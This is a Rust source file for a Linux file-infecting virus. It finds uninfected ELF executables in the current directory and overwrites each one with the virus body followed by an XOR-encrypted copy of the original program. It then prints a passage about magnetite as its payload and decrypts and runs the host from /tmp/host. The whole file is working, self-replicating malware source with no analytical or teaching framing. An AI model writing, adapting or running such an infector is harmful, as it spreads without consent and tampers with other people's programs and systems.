#![allow(non_snake_case)]

use std::{
    env,
    error::{self, Error},
    ffi::{OsStr, OsString},
    fs::{self, File},
    io::{Read, Seek, SeekFrom, Write},
    os::unix::prelude::{MetadataExt, OpenOptionsExt},
    process::{self, Command},
};

const ELF_MAGIC: &[u8; 4] = b"\x7FELF";
const INFECTION_MARK: &[u8; 4] = b"0xd0";
const XOR_KEY: &[u8; 5] = b"Fe3O4";
const VIRUS_SIZE: u64 = 4466160;

struct Infector;

impl Infector {
    pub fn new() -> Self {
        Self
    }

    fn payload(&self) {
        println!("Iron(II,III) oxide, or black iron oxide, is the chemical compound with formula Fe3O4.\nIt occurs in nature as the mineral magnetite. It is one of a number of iron oxides, the others being iron(II) oxide (FeO), which is rare, and iron(III) oxide (Fe2O3) which also occurs naturally as the mineral hematite.\n");
    }

    pub fn run(&self) -> Result<(), Box<dyn error::Error>> {
        let args: Vec<String> = env::args().collect();
        let this_binary = OsString::from(&args[0]);

        let current_dir = env::current_dir()?;

        for entry in fs::read_dir(&current_dir)? {
            let entry = entry?;
            let path = entry.path();

            let metadata = fs::metadata(&path)?;

            if metadata.is_file() {
                let file_name = entry.file_name();
                if this_binary == file_name {
                    continue; // Skip this binary
                }

                if self.is_elf(&file_name)? && !self.is_infected(&file_name)? {
                    self.infect(&this_binary, &file_name)?;
                }
            }
        }

        if self.filesize(&this_binary)? > VIRUS_SIZE {
            self.payload();
            self.run_infected_host(&this_binary)?;
        } else {
            process::exit(0);
        }

        Ok(())
    }

    fn run_infected_host(&self, path: &OsStr) -> Result<(), Box<dyn error::Error>> {
        let mut encrypted_buf = Vec::new();
        let mut infected = File::open(path)?;

        let plain_host_path = "/tmp/host";
        let mut plain_host = fs::OpenOptions::new()
            .create(true)
            .write(true)
            .mode(0o755)
            .open(plain_host_path)?;

        infected.seek(SeekFrom::Start(VIRUS_SIZE))?;
        infected.read_to_end(&mut encrypted_buf)?;
        drop(infected);

        let decrypted_buf = self.xor_encode_decode(encrypted_buf);
        plain_host.write_all(&decrypted_buf)?;
        plain_host.sync_all()?;
        plain_host.flush()?;
        drop(plain_host);

        Command::new(plain_host_path).status()?;
        fs::remove_file(plain_host_path)?;

        Ok(())
    }

    fn infect(&self, virus: &OsString, target: &OsStr) -> Result<(), Box<dyn error::Error>> {
        let host_buf = self.read_file(target)?;
        let encrypted_buf = self.xor_encode_decode(host_buf);
        let mut virus_buf = vec![0; VIRUS_SIZE as usize];
        let mut file = File::open(virus)?;
        file.read_exact(&mut virus_buf)?;

        // Create new target file which have infected code at start then original code
        let mut infected = File::create(target)?;
        infected.write_all(&virus_buf)?;
        infected.write_all(&encrypted_buf)?;
        infected.sync_all()?;
        infected.flush()?;

        Ok(())
    }

    fn is_infected(&self, path: &OsStr) -> Result<bool, Box<dyn Error>> {
        let filesize = self.filesize(path)? as usize;
        let buffer = self.read_file(path)?;

        // Check is INFECTION MARK is present in entire buffer of file
        for i in 1..filesize {
            if buffer[i] == INFECTION_MARK[0] {
                for j in 1..INFECTION_MARK.len() {
                    if i + j >= filesize {
                        break;
                    }

                    if buffer[i + j] != INFECTION_MARK[j] {
                        break;
                    }

                    if j == INFECTION_MARK.len() - 1 {
                        return Ok(true);
                    }
                }
            }
        }

        Ok(false)
    }

    // Check if starting bytes have ELF MAGIC Number
    fn is_elf(&self, path: &OsStr) -> Result<bool, Box<dyn Error>> {
        let mut header = [0; 4];
        let mut file = File::open(path)?;
        file.read_exact(&mut header)?;

        // Can fail on shared libraries
        Ok(ELF_MAGIC == &header)
    }

    fn xor_encode_decode(&self, mut input: Vec<u8>) -> Vec<u8> {
        for x in 0..input.len() {
            input[x] ^= XOR_KEY[x % XOR_KEY.len()];
        }
        input
    }

    fn read_file(&self, path: &OsStr) -> Result<Vec<u8>, Box<dyn Error>> {
        Ok(fs::read(path)?)
    }

    fn filesize(&self, path: &OsStr) -> Result<u64, Box<dyn Error>> {
        let file = fs::metadata(path)?;
        Ok(file.size())
    }
}

fn main() -> Result<(), Box<dyn error::Error>> {
    let infector = Infector::new();
    infector.run()?;

    Ok(())
}
